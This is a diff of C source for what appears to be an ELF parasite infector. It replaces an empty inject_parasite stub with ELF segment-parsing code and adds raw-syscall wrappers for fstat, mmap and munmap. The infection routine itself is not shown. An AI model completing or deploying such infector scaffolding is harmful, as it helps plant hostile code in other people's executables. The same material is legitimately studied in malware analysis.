@@ -1,8 +1,21 @@
 #include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
 #include <sys/types.h>
-#include <sys/stat.h>
-#include <fcntl.h>
+#include <sys/ptrace.h>
 #include <elf.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <sys/syscall.h>
+#include <link.h>
+#include <sys/stat.h>
+#include <stdarg.h>
+#include <time.h>
+#include <signal.h>
+#include <sys/user.h>
+#include <sys/prctl.h>
+#include <sys/time.h>
 
 /* libc */
 void _memcpy(void *dst, void *src, unsigned int len);
@@ -12,17 +25,29 @@ int _memcmp(const void *s1, const void *s2, unsigned int n);
 void Exit(long);
 int _read(long fd, char *buf, unsigned long len);
 long _write(long fd, char *buf, unsigned long len);
+int _fstat(long fd, void *buf);
 int _close(unsigned int fd);
 long _open(const char *path, unsigned long flags, long mode);
+void *_mmap(void *addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off);
+int _munmap(void *addr, size_t len);
 
 #define __ASM__ __asm__ __volatile__
 #define PAGE_SIZE 4096
+
+extern long real_start;
 
 typedef struct elfbin {
 	/* Headers */
 	Elf64_Ehdr* ehdr;
 	Elf64_Phdr* phdr;
 	Elf64_Shdr* shdr;
+	Elf64_Dyn* dyn;
+	Elf64_Addr textVaddr;
+	Elf64_Addr dataVaddr;
+	size_t textSize;
+	size_t dataSize;
+	Elf64_Off dataOff;
+	Elf64_Off textOff;
 	/* Memory */	
 	uint8_t* mem;
 	size_t size;	
@@ -99,20 +124,56 @@ void do_main() {
 	
 }
 
-
-int load_target(const char *path) {
-
-
+void unload_target(elfbin_t* elf) {	
+	_munmap(elf->mem, elf->size);
+	_close(elf->fd);
 }
 
-void inject_parasite(char *host_name, 
-					 size_t psize, 
-					 size_t hsize, 
-					 uint8_t *mem, 
-					 size_t end_of_text, 
-					 uint8_t* parasite, 
-					 uint32_t jmp_code_offset) {
-	
+int load_target(const char *path, elfbin_t* elf) {
+	int i;
+	struct stat st;
+	elf->path = (char*)path;
+	int fd = open(path, O_RDONLY, 0);
+	if (fd < 0) {
+		return -1;
+	}
+	elf->fd = fd;
+	if (_fstat(fd, &st) < 0) {
+		return -1;
+	}
+	elf->mem = _mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
+	if (elf->mem == MAP_FAILED) {
+		return -1;
+	}
+
+	elf->ehdr = (Elf64_Ehdr*)elf->mem;
+	elf->phdr = (Elf64_Phdr*)&elf->mem[elf->ehdr->e_phoff];
+	elf->shdr = (Elf64_Shdr*)&elf->mem[elf->ehdr->e_shoff];
+
+	for (i = 0; i < elf->ehdr->e_phnum; i++) {
+		switch(elf->phdr[i].p_type) {
+			case PT_LOAD:
+				switch(!!elf->phdr[i].p_offset) {
+					case 0:
+						elf->textVaddr = elf->phdr[i].p_vaddr;
+						elf->textSize = elf->phdr[i].p_memsz;
+					break;
+					case 1:
+						elf->dataVaddr = elf->phdr[i].p_vaddr;
+						elf->dataSize = elf->phdr[i].p_memsz;
+						elf->dataOff = elf->phdr[i].p_offset;
+					break;
+				}
+			break;
+			case PT_DYNAMIC:
+				elf->dyn = (Elf64_Dyn*)&elf->mem[elf->phdr[i].p_offset];
+			break;
+			default: break;
+		}
+	}
+	elf->st = st;
+	elf->size = st.st_size;
+	return 0;
 }
 
 /*
@@ -193,6 +254,17 @@ long _write(long fd, char *buf, unsigned long len) {
         return ret;
 }
 
+int _fstat(long fd, void *buf) {
+        long ret;
+        __asm__ volatile(
+                        "mov %0, %%rdi\n"
+                        "mov %1, %%rsi\n"
+                        "mov $5, %%rax\n"
+                        "syscall" : : "g"(fd), "g"(buf));
+        asm("mov %%rax, %0" : "=r"(ret));
+        return (int)ret;
+}
+
 int _close(unsigned int fd) {
         long ret;
         __asm__ volatile(
@@ -214,7 +286,35 @@ long _open(const char *path, unsigned long flags, long mode) {
         return ret;
 }
 
+void *_mmap(void *addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off) {
+        long mmap_fd = fd;
+        unsigned long mmap_off = off;
+        unsigned long mmap_flags = flags;
+        unsigned long ret;
 
+        __asm__ volatile(
+                         "mov %0, %%rdi\n"
+                         "mov %1, %%rsi\n"
+                         "mov %2, %%rdx\n"
+                         "mov %3, %%r10\n"
+                         "mov %4, %%r8\n"
+                         "mov %5, %%r9\n"
+                         "mov $9, %%rax\n"
+                         "syscall\n" : : "g"(addr), "g"(len), "g"(prot), "g"(flags), "g"(mmap_fd), "g"(mmap_off));
+        asm ("mov %%rax, %0" : "=r"(ret));              
+        return (void *)ret;
+}
+
+int _munmap(void *addr, size_t len){
+        long ret;
+        __asm__ volatile(
+                        "mov %0, %%rdi\n"
+                        "mov %1, %%rsi\n"
+                        "mov $11, %%rax\n"
+                        "syscall" :: "g"(addr), "g"(len));
+        asm ("mov %%rax, %0" : "=r"(ret));
+        return (int)ret;
+}
 
 /* --------------------- LibC ---------------------------------- */
 
